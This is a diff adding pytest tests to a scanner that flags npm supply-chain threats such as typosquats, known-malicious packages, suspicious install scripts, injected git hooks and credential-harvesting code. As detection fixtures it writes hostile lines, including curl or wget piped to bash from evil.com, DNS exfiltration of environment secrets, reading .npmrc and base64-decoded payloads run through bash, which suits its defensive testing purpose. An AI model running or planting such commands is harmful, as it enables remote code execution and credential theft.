@@ -165,6 +165,20 @@ class TestLevenshtein:
         assert _levenshtein("express", "expres") == 1
         assert _levenshtein("cross-env", "crossenv") == 1
 
+    def test_longer_strings(self) -> None:
+        # typescript vs typescrpit (transposition)
+        dist = _levenshtein("typescript", "typescrpit")
+        assert dist >= 1
+
+    def test_single_char_strings(self) -> None:
+        assert _levenshtein("a", "b") == 1
+        assert _levenshtein("a", "a") == 0
+
+    def test_returns_integer(self) -> None:
+        result = _levenshtein("foo", "bar")
+        assert isinstance(result, int)
+        assert result >= 0
+
 
 # ---------------------------------------------------------------------------
 # TestDetectKnownMalicious
@@ -228,6 +242,12 @@ class TestDetectKnownMalicious:
         f = _assert_finding(findings, detector="known-malicious")
         assert "reference" in f["metadata"]
 
+    def test_metadata_contains_installed_version(self) -> None:
+        packages = [_pkg("crossenv", "2.5.0")]
+        findings = detect_known_malicious(packages)
+        f = _assert_finding(findings, detector="known-malicious")
+        assert f["metadata"]["installed_version"] == "2.5.0"
+
     def test_multiple_known_bad_packages(self) -> None:
         packages = [
             _pkg("crossenv", "1.0.0"),
@@ -251,6 +271,65 @@ class TestDetectKnownMalicious:
         packages = [_pkg("twilio-npm", "1.0.0")]
         findings = detect_known_malicious(packages)
         _assert_finding(findings, package="twilio-npm", severity="critical")
+
+    def test_node_ipc_bad_version_flagged(self) -> None:
+        packages = [_pkg("node-ipc", "10.1.1")]
+        findings = detect_known_malicious(packages)
+        _assert_finding(findings, package="node-ipc", severity="critical")
+
+    def test_node_ipc_safe_version_not_flagged(self) -> None:
+        packages = [_pkg("node-ipc", "9.2.1")]
+        findings = detect_known_malicious(packages)
+        node_ipc = [f for f in findings if "node-ipc" in f.get("package", "")]
+        assert len(node_ipc) == 0
+
+    def test_description_mentions_package_name(self) -> None:
+        packages = [_pkg("crossenv", "1.0.0")]
+        findings = detect_known_malicious(packages)
+        f = _assert_finding(findings, detector="known-malicious")
+        assert "crossenv" in f["description"]
+
+    def test_remediation_is_non_empty(self) -> None:
+        packages = [_pkg("crossenv", "1.0.0")]
+        findings = detect_known_malicious(packages)
+        f = _assert_finding(findings, detector="known-malicious")
+        assert isinstance(f["remediation"], str)
+        assert len(f["remediation"].strip()) > 0
+
+    def test_eslint_scope_flagged(self) -> None:
+        packages = [_pkg("eslint-scope", "3.7.2")]
+        findings = detect_known_malicious(packages)
+        _assert_finding(findings, package="eslint-scope", severity="critical")
+
+    def test_flatmap_stream_flagged(self) -> None:
+        packages = [_pkg("flatmap-stream", "0.1.1")]
+        findings = detect_known_malicious(packages)
+        _assert_finding(findings, package="flatmap-stream", severity="critical")
+
+    def test_peacenotwar_flagged(self) -> None:
+        """peacenotwar has no pinned versions — all versions should be flagged."""
+        packages = [_pkg("peacenotwar", "9.1.3")]
+        findings = detect_known_malicious(packages)
+        _assert_finding(findings, package="peacenotwar")
+
+    def test_returns_only_first_matching_record(self) -> None:
+        """A package should produce at most one finding per installed instance."""
+        packages = [_pkg("crossenv", "1.0.0")]
+        findings = detect_known_malicious(packages)
+        crossenv_findings = [
+            f for f in findings if f.get("package") == "crossenv"
+        ]
+        assert len(crossenv_findings) == 1
+
+    def test_mixed_safe_and_bad_packages(self) -> None:
+        packages = [
+            _pkg("lodash", "4.17.21"),
+            _pkg("crossenv", "1.0.0"),
+            _pkg("react", "18.2.0"),
+        ]
+        findings = detect_known_malicious(packages)
+        assert len(findings) == 1
+        assert findings[0]["package"] == "crossenv"
 
 
 # ---------------------------------------------------------------------------
@@ -311,15 +390,26 @@ class TestDetectTyposquatting:
         assert f["metadata"]["likely_target"] == "lodash"
         assert f["metadata"]["edit_distance"] == 1
 
+    def test_metadata_contains_edit_distance(self) -> None:
+        packages = [_pkg("lod4sh", "4.17.20")]
+        findings = detect_typosquatting(packages)
+        f = _assert_finding(findings, detector="typosquatting")
+        assert isinstance(f["metadata"]["edit_distance"], int)
+        assert f["metadata"]["edit_distance"] >= 1
+
+    def test_metadata_contains_target_downloads(self) -> None:
+        packages = [_pkg("lod4sh", "4.17.20")]
+        findings = detect_typosquatting(packages)
+        f = _assert_finding(findings, detector="typosquatting")
+        assert "target_weekly_downloads" in f["metadata"]
+        assert f["metadata"]["target_weekly_downloads"] > 0
+
     def test_empty_input(self) -> None:
         assert detect_typosquatting([]) == []
 
     def test_short_package_name_no_false_positive(self) -> None:
-        """Short package names like 'qs', 'ws', 'nx' should not match each other."""
+        """Short package names like 'qs', 'ws', 'nx' should not crash."""
         packages = [_pkg("ax", "1.0.0")]
-        # 'ax' is edit-distance 1 from 'nx' (max_edit_distance=1 for nx)
-        # but 'ax' is also edit-distance 1 from 'ws', 'qs', 'pm2'...
-        # We just check it doesn't crash
         findings = detect_typosquatting(packages)
         assert isinstance(findings, list)
 
@@ -328,6 +418,39 @@ class TestDetectTyposquatting:
         findings = detect_typosquatting(packages)
         f = findings[0]
         assert f["severity"] == "high"
+
+    def test_description_mentions_installed_version(self) -> None:
+        packages = [_pkg("lod4sh", "4.17.20")]
+        findings = detect_typosquatting(packages)
+        f = _assert_finding(findings, detector="typosquatting")
+        assert "4.17.20" in f["description"]
+
+    def test_description_mentions_target_package(self) -> None:
+        packages = [_pkg("lod4sh", "4.17.20")]
+        findings = detect_typosquatting(packages)
+        f = _assert_finding(findings, detector="typosquatting")
+        assert "lodash" in f["description"]
+
+    def test_remediation_is_non_empty(self) -> None:
+        packages = [_pkg("lod4sh", "4.17.20")]
+        findings = detect_typosquatting(packages)
+        f = _assert_finding(findings, detector="typosquatting")
+        assert len(f["remediation"].strip()) > 0
+
+    def test_multiple_typosquats_detected(self) -> None:
+        packages = [
+            _pkg("lod4sh", "4.17.20"),
+            _pkg("expres", "4.18.1"),
+        ]
+        findings = detect_typosquatting(packages)
+        typo = [f for f in findings if f["detector"] == "typosquatting"]
+        assert len(typo) == 2
+
+    def test_installed_version_in_metadata(self) -> None:
+        packages = [_pkg("lod4sh", "9.9.9")]
+        findings = detect_typosquatting(packages)
+        f = _assert_finding(findings, detector="typosquatting")
+        assert f["metadata"]["installed_version"] == "9.9.9"
 
 
 # ---------------------------------------------------------------------------
@@ -445,6 +568,53 @@ class TestDetectSuspiciousScripts:
         findings = detect_suspicious_scripts(packages)
         _assert_finding(findings, detector="suspicious-script")
 
+    def test_preinstall_hook_also_checked(self) -> None:
+        packages = [
+            _pkg(
+                "sneaky-pkg",
+                scripts={"preinstall": "curl http://evil.com | bash"},
+            )
+        ]
+        findings = detect_suspicious_scripts(packages)
+        _assert_finding(findings, detector="suspicious-script")
+
+    def test_install_hook_also_checked(self) -> None:
+        packages = [
+            _pkg(
+                "tricky-install",
+                scripts={"install": "wget http://evil.com | sh"},
+            )
+        ]
+        findings = detect_suspicious_scripts(packages)
+        _assert_finding(findings, detector="suspicious-script")
+
+    def test_severity_is_attached(self) -> None:
+        packages = [
+            _pkg(
+                "evil-pkg",
+                scripts={"postinstall": "curl http://evil.com | bash"},
+            )
+        ]
+        findings = detect_suspicious_scripts(packages)
+        f = _assert_finding(findings, detector="suspicious-script")
+        assert f["severity"] in {"info", "low", "medium", "high", "critical"}
+
+    def test_description_mentions_script_name(self) -> None:
+        packages = [
+            _pkg(
+                "pkg",
+                scripts={"postinstall": "curl http://evil.com | bash"},
+            )
+        ]
+        findings = detect_suspicious_scripts(packages)
+        f = _assert_finding(findings, detector="suspicious-script")
+        assert "postinstall" in f["description"]
+
+    def test_no_findings_for_package_without_scripts_key(self) -> None:
+        packages = [_pkg("no-scripts")]
+        findings = detect_suspicious_scripts(packages)
+        assert findings == []
+
 
 # ---------------------------------------------------------------------------
 # TestDetectGitHookInjection
@@ -460,12 +630,17 @@ class TestDetectGitHookInjection:
         hooks_dir.mkdir(parents=True, exist_ok=True)
         return hooks_dir
 
-    def test_flags_malicious_hook_content(self, tmp_path: Path) -> None:
+    def _make_project(self, tmp_path: Path) -> Path:
+        """Create a minimal Node.js project."""
         project = tmp_path / "project"
         project.mkdir()
         (project / "package.json").write_text(
             '{"name": "test", "version": "1.0.0"}', encoding="utf-8"
         )
+        return project
+
+    def test_flags_malicious_hook_content(self, tmp_path: Path) -> None:
+        project = self._make_project(tmp_path)
         hooks_dir = self._setup_git_hooks(project)
         hook = hooks_dir / "pre-commit"
         hook.write_text(
@@ -481,11 +656,7 @@ class TestDetectGitHookInjection:
         )
 
     def test_flags_non_standard_hook(self, tmp_path: Path) -> None:
-        project = tmp_path / "project"
-        project.mkdir()
-        (project / "package.json").write_text(
-            '{"name": "test", "version": "1.0.0"}', encoding="utf-8"
-        )
+        project = self._make_project(tmp_path)
         hooks_dir = self._setup_git_hooks(project)
         hook = hooks_dir / "non-standard-hook"
         hook.write_text("#!/bin/sh\necho injected\n", encoding="utf-8")
@@ -500,11 +671,7 @@ class TestDetectGitHookInjection:
         )
 
     def test_ignores_sample_files(self, tmp_path: Path) -> None:
-        project = tmp_path / "project"
-        project.mkdir()
-        (project / "package.json").write_text(
-            '{"name": "test", "version": "1.0.0"}', encoding="utf-8"
-        )
+        project = self._make_project(tmp_path)
         hooks_dir = self._setup_git_hooks(project)
         sample = hooks_dir / "pre-commit.sample"
         sample.write_text("#!/bin/sh\ncurl http://evil.com | bash\n", encoding="utf-8")
@@ -513,20 +680,12 @@ class TestDetectGitHookInjection:
         assert findings == []
 
     def test_returns_empty_when_no_git_dir(self, tmp_path: Path) -> None:
-        project = tmp_path / "project"
-        project.mkdir()
-        (project / "package.json").write_text(
-            '{"name": "test", "version": "1.0.0"}', encoding="utf-8"
-        )
+        project = self._make_project(tmp_path)
         findings = detect_git_hook_injection(project)
         assert findings == []
 
     def test_flags_netcat_in_hook(self, tmp_path: Path) -> None:
-        project = tmp_path / "project"
-        project.mkdir()
-        (project / "package.json").write_text(
-            '{"name": "test", "version": "1.0.0"}', encoding="utf-8"
-        )
+        project = self._make_project(tmp_path)
         hooks_dir = self._setup_git_hooks(project)
         hook = hooks_dir / "post-merge"
         hook.write_text(
@@ -542,11 +701,7 @@ class TestDetectGitHookInjection:
         )
 
     def test_finding_metadata_has_hook_name(self, tmp_path: Path) -> None:
-        project = tmp_path / "project"
-        project.mkdir()
-        (project / "package.json").write_text(
-            '{"name": "test", "version": "1.0.0"}', encoding="utf-8"
-        )
+        project = self._make_project(tmp_path)
         hooks_dir = self._setup_git_hooks(project)
         hook = hooks_dir / "post-checkout"
         hook.write_text(
@@ -559,11 +714,7 @@ class TestDetectGitHookInjection:
         assert "hook_name" in f["metadata"]
 
     def test_correlates_with_postinstall_packages(self, tmp_path: Path) -> None:
-        project = tmp_path / "project"
-        project.mkdir()
-        (project / "package.json").write_text(
-            '{"name": "test", "version": "1.0.0"}', encoding="utf-8"
-        )
+        project = self._make_project(tmp_path)
         hooks_dir = self._setup_git_hooks(project)
         hook = hooks_dir / "pre-push"
         hook.write_text("#!/bin/sh\ncurl http://evil.com | bash\n", encoding="utf-8")
@@ -581,6 +732,56 @@ class TestDetectGitHookInjection:
             "hook-injector" in f["description"]
             or "hook-injector" in str(f["metadata"])
         )
+
+    def test_malicious_content_in_standard_hook(self, tmp_path: Path) -> None:
+        project = self._make_project(tmp_path)
+        hooks_dir = self._setup_git_hooks(project)
+        # pre-commit IS a standard hook, but has malicious content
+        hook = hooks_dir / "pre-commit"
+        hook.write_text(
+            "#!/bin/sh\nwget https://evil.com/payload\n",
+            encoding="utf-8",
+        )
+
+        findings = detect_git_hook_injection(project)
+        _assert_finding(findings, detector="git-hook")
+
+    def test_empty_standard_hook_not_flagged(self, tmp_path: Path) -> None:
+        project = self._make_project(tmp_path)
+        hooks_dir = self._setup_git_hooks(project)
+        # Standard hook with benign content
+        hook = hooks_dir / "pre-commit"
+        hook.write_text("#!/bin/sh\nexit 0\n", encoding="utf-8")
+
+        findings = detect_git_hook_injection(project)
+        # Should not flag a hook with no malicious patterns
+        malicious = [
+            f for f in findings
+            if f.get("metadata", {}).get("finding_type") == "malicious-content"
+        ]
+        assert len(malicious) == 0
+
+    def test_finding_metadata_contains_hook_path(self, tmp_path: Path) -> None:
+        project = self._make_project(tmp_path)
+        hooks_dir = self._setup_git_hooks(project)
+        hook = hooks_dir / "post-receive"
+        hook.write_text("#!/bin/sh\ncurl http://evil.com | bash\n", encoding="utf-8")
+
+        findings = detect_git_hook_injection(project)
+        f = _assert_finding(findings, detector="git-hook")
+        assert "hook_path" in f["metadata"]
+
+    def test_base64_decode_in_hook_flagged(self, tmp_path: Path) -> None:
+        project = self._make_project(tmp_path)
+        hooks_dir = self._setup_git_hooks(project)
+        hook = hooks_dir / "post-merge"
+        hook.write_text(
+            "#!/bin/sh\nopenssl base64 -d payload.b64 | bash\n",
+            encoding="utf-8",
+        )
+
+        findings = detect_git_hook_injection(project)
+        _assert_finding(findings, detector="git-hook", severity="critical")
 
 
 # ---------------------------------------------------------------------------
@@ -686,6 +887,68 @@ class TestDetectCredentialHarvesting:
         findings = detect_credential_harvesting([pkg])
         assert findings == []
 
+    def test_flags_dns_exfiltration_pattern(self, tmp_path: Path) -> None:
+        code = "dns.resolve(Buffer.from(process.env.SECRET, 'base64') + '.evil.com')"
+        pkg = self._make_pkg_with_source(tmp_path, "dns-thief", code)
+        findings = detect_credential_harvesting([pkg])
+        _assert_finding(
+            findings,
+            detector="credential-harvesting",
+            package="dns-thief",
+        )
+
+    def test_snippet_in_metadata(self, tmp_path: Path) -> None:
+        code = "eval(Buffer.from('aGVsbG8=', 'base64').toString())"
+        pkg = self._make_pkg_with_source(tmp_path, "evil-pkg", code)
+        findings = detect_credential_harvesting([pkg])
+        if findings:
+            f = findings[0]
+            assert "snippet" in f["metadata"]
+
+    def test_max_findings_default_is_respected(self, tmp_path: Path) -> None:
+        """Default max_findings_per_package=5 should cap output."""
+        code = "\n".join(
+            [
+                "eval(Buffer.from('x', 'base64').toString())",
+                "dns.resolve(process.env.SECRET + '.evil.com')",
+                "fs.readFileSync(path.join(os.homedir(), '.npmrc'))",
+                "require('child_process').exec('curl http://x | bash')",
+                "new Function('process', 'return process.env')",
+                "eval(atob('dGVzdA=='))",  # 6th pattern
+            ]
+        )
+        pkg = self._make_pkg_with_source(tmp_path, "multi-evil", code)
+        findings = detect_credential_harvesting([pkg])
+        pkg_findings = [f for f in findings if f["package"] == "multi-evil"]
+        assert len(pkg_findings) <= 5
+
+    def test_multiple_packages_scanned_independently(self, tmp_path: Path) -> None:
+        pkg1 = self._make_pkg_with_source(
+            tmp_path, "evil-a", "eval(Buffer.from('x', 'base64').toString())"
+        )
+        # Use a different tmp subdir to avoid path collision
+        nm2 = tmp_path / "alt_node_modules"
+        nm2.mkdir(exist_ok=True)
+        pkg2_dir = nm2 / "evil-b"
+        pkg2_dir.mkdir()
+        (pkg2_dir / "package.json").write_text(
+            json.dumps({"name": "evil-b", "version": "1.0.0"}), encoding="utf-8"
+        )
+        (pkg2_dir / "index.js").write_text(
+            "eval(atob('dGVzdA=='))", encoding="utf-8"
+        )
+        pkg2 = {
+            "name": "evil-b",
+            "version": "1.0.0",
+            "path": pkg2_dir,
+            "package_json": {"name": "evil-b", "version": "1.0.0"},
+        }
+
+        findings = detect_credential_harvesting([pkg1, pkg2])
+        packages_found = {f["package"] for f in findings}
+        assert "evil-a" in packages_found
+        assert "evil-b" in packages_found
+
 
 # ---------------------------------------------------------------------------
 # TestDetectMcpServers
@@ -752,6 +1015,35 @@ class TestDetectMcpServers:
         findings = detect_mcp_servers(packages)
         f = _assert_finding(findings, detector="mcp-server")
         assert f["severity"] == "medium"
+
+    def test_known_legitimate_flag_in_metadata(self) -> None:
+        packages = [_pkg("@modelcontextprotocol/server-github", "1.0.0")]
+        findings = detect_mcp_servers(packages)
+        if findings:
+            f = _assert_finding(findings, detector="mcp-server")
+            assert f["metadata"]["is_known_legitimate"] is True
+
+    def test_unknown_mcp_server_is_not_legitimate(self) -> None:
+        packages = [_pkg("rogue-mcp-server", "1.0.0")]
+        findings = detect_mcp_servers(packages)
+        f = _assert_finding(findings, detector="mcp-server")
+        assert f["metadata"]["is_known_legitimate"] is False
+
+    def test_mcp_bridge_keyword_flagged(self) -> None:
+        packages = [_pkg("my-mcp-bridge", "1.0.0")]
+        findings = detect_mcp_servers(packages)
+        _assert_finding(findings, detector="mcp-server")
+
+    def test_model_context_in_name_flagged(self) -> None:
+        packages = [_pkg("model-context-helper", "1.0.0")]
+        findings = detect_mcp_servers(packages)
+        _assert_finding(findings, detector="mcp-server")
+
+    def test_remediation_is_non_empty(self) -> None:
+        packages = [_pkg("rogue-mcp-server", "1.0.0")]
+        findings = detect_mcp_servers(packages)
+        f = _assert_finding(findings, detector="mcp-server")
+        assert len(f["remediation"].strip()) > 0
 
 
 # ---------------------------------------------------------------------------
@@ -876,6 +1168,52 @@ class TestDetectRogueBinaries:
             assert "bin_path" in f["metadata"]
             assert "owning_package" in f["metadata"]
 
+    def test_declared_bins_are_excluded(self, tmp_path: Path) -> None:
+        """Bins declared by the root project should not be flagged."""
+        nm = self._make_bin_entry(tmp_path, "my-app-cli", None)
+        findings = detect_rogue_binaries(
+            nm, [], declared_bin_names={"my-app-cli"}
+        )
+        assert findings == []
+
+    def test_finding_severity_is_high_for_unattributed(self, tmp_path: Path) -> None:
+        nm = self._make_bin_entry(tmp_path, "mystery-cli", None)
+        findings = detect_rogue_binaries(nm, [])
+        if findings:
+            f = _assert_finding(
+                findings,
+                detector="rogue-binary",
+                description_contains="mystery-cli",
+            )
+            assert f["severity"] == "high"
+
+    def test_mcp_binary_severity_is_medium(self, tmp_path: Path) -> None:
+        nm = self._make_bin_entry(
+            tmp_path, "mcp-server-cli", "some-package", as_symlink=True
+        )
+        packages = [_pkg("some-package")]
+        pkg_dir = nm / "some-package"
+        pkg_dir.mkdir(exist_ok=True)
+        (pkg_dir / "package.json").write_text(
+            '{"name": "some-package", "version": "1.0.0"}',
+            encoding="utf-8",
+        )
+        findings = detect_rogue_binaries(nm, packages)
+        mcp_findings = [
+            f for f in findings
+            if f.get("detector") == "rogue-binary"
+            and "mcp-server-cli" in f.get("package", "")
+        ]
+        if mcp_findings:
+            assert mcp_findings[0]["severity"] == "medium"
+
+    def test_finding_type_in_metadata(self, tmp_path: Path) -> None:
+        nm = self._make_bin_entry(tmp_path, "mystery-cli", None)
+        findings = detect_rogue_binaries(nm, [])
+        if findings:
+            f = findings[0]
+            assert "finding_type" in f["metadata"]
+
 
 # ---------------------------------------------------------------------------
 # TestDetectDependencyConfusion
@@ -946,6 +1284,48 @@ class TestDetectDependencyConfusion:
         findings = detect_dependency_confusion(packages)
         f = _assert_finding(findings, detector="dep-confusion")
         assert f["severity"] == "high"
+
+    def test_flags_company_prefix(self) -> None:
+        packages = [_pkg("company-shared-lib", "1.0.0")]
+        findings = detect_dependency_confusion(packages)
+        _assert_finding(findings, detector="dep-confusion")
+
+    def test_flags_proprietary_prefix(self) -> None:
+        packages = [_pkg("proprietary-auth", "1.0.0")]
+        findings = detect_dependency_confusion(packages)
+        _assert_finding(findings, detector="dep-confusion")
+
+    def test_description_mentions_package_name(self) -> None:
+        packages = [_pkg("internal-utils", "1.0.0")]
+        findings = detect_dependency_confusion(packages)
+        f = _assert_finding(findings, detector="dep-confusion")
+        assert "internal-utils" in f["description"]
+
+    def test_remediation_is_non_empty(self) -> None:
+        packages = [_pkg("internal-utils", "1.0.0")]
+        findings = detect_dependency_confusion(packages)
+        f = _assert_finding(findings, detector="dep-confusion")
+        assert len(f["remediation"].strip()) > 0
+
+    def test_threshold_boundary_not_flagged(self) -> None:
+        """Version below threshold should not trigger high-version detection."""
+        packages = [_pkg("some-lib", "100.0.0")]
+        findings = detect_dependency_confusion(packages)
+        # 100 < 9000 (DEP_CONFUSION_HIGH_VERSION_THRESHOLD)
+        high_version_findings = [
+            f for f in findings
+            if "high version" in " ".join(f.get("metadata", {}).get("matched_reasons", []))
+        ]
+        assert len(high_version_findings) == 0
+
+    def test_declared_version_in_metadata(self) -> None:
+        packages = [_pkg("internal-service", "1.0.0")]
+        declared = {"internal-service": "^2.0.0"}
+        findings = detect_dependency_confusion(
+            packages, declared_dependencies=declared
+        )
+        f = _assert_finding(findings, detector="dep-confusion")
+        assert f["metadata"]["declared_version"] == "^2.0.0"
 
 
 # ---------------------------------------------------------------------------
@@ -1033,8 +1413,90 @@ class TestRunAllDetectors:
         result = run_all_detectors(
             project, packages, nm, enable_credential_scan=False
         )
-        required_keys = {"package", "detector", "severity", "description", "remediation", "metadata"}
+        required_keys = {
+            "package",
+            "detector",
+            "severity",
+            "description",
+            "remediation",
+            "metadata",
+        }
         for finding in result:
             assert required_keys.issubset(finding.keys()), (
                 f"Finding missing keys: {required_keys - finding.keys()}\n{finding}"
+            )
+
+    def test_run_all_with_none_node_modules(self, tmp_path: Path) -> None:
+        """run_all_detectors should handle node_modules=None gracefully."""
+        project = tmp_path / "project"
+        project.mkdir()
+        (project / "package.json").write_text(
+            '{"name": "test", "version": "1.0.0"}', encoding="utf-8"
+        )
+        packages = [_pkg("crossenv", "1.0.0")]
+        result = run_all_detectors(
+            project, packages, None, enable_credential_scan=False
+        )
+        assert isinstance(result, list)
+        # known-malicious should still fire even without node_modules
+        malicious = [f for f in result if f["detector"] == "known-malicious"]
+        assert len(malicious) >= 1
+
+    def test_credential_scan_disabled(self, tmp_path: Path) -> None:
+        """When credential scan is disabled, no credential-harvesting findings."""
+        project = tmp_path / "project"
+        project.mkdir()
+        (project / "package.json").write_text(
+            '{"name": "test", "version": "1.0.0"}', encoding="utf-8"
+        )
+        nm = tmp_path / "node_modules"
+        nm.mkdir()
+        packages = [_pkg("crossenv", "1.0.0")]
+        result = run_all_detectors(
+            project, packages, nm, enable_credential_scan=False
+        )
+        cred_findings = [
+            f for f in result if f["detector"] == "credential-harvesting"
+        ]
+        assert len(cred_findings) == 0
+
+    def test_declared_dependencies_passed_to_dep_confusion(self, tmp_path: Path) -> None:
+        project = tmp_path / "project"
+        project.mkdir()
+        (project / "package.json").write_text(
+            '{"name": "test", "version": "1.0.0"}', encoding="utf-8"
+        )
+        nm = tmp_path / "node_modules"
+        nm.mkdir()
+        packages = [_pkg("internal-utils", "9999.0.0")]
+        declared = {"internal-utils": "9999.0.0"}
+        result = run_all_detectors(
+            project,
+            packages,
+            nm,
+            declared_dependencies=declared,
+            enable_credential_scan=False,
+        )
+        dep_conf = [f for f in result if f["detector"] == "dep-confusion"]
+        assert len(dep_conf) >= 1
+
+    def test_severities_all_valid(self, tmp_path: Path) -> None:
+        valid_severities = {"info", "low", "medium", "high", "critical"}
+        project = tmp_path / "project"
+        project.mkdir()
+        (project / "package.json").write_text(
+            '{"name": "test", "version": "1.0.0"}', encoding="utf-8"
+        )
+        nm = tmp_path / "node_modules"
+        nm.mkdir()
+        packages = [
+            _pkg("crossenv", "1.0.0"),
+            _pkg("lod4sh", "4.17.20"),
+        ]
+        result = run_all_detectors(
+            project, packages, nm, enable_credential_scan=False
+        )
+        for finding in result:
+            assert finding["severity"] in valid_severities, (
+                f"Invalid severity '{finding['severity']}' in finding: {finding}"
             )
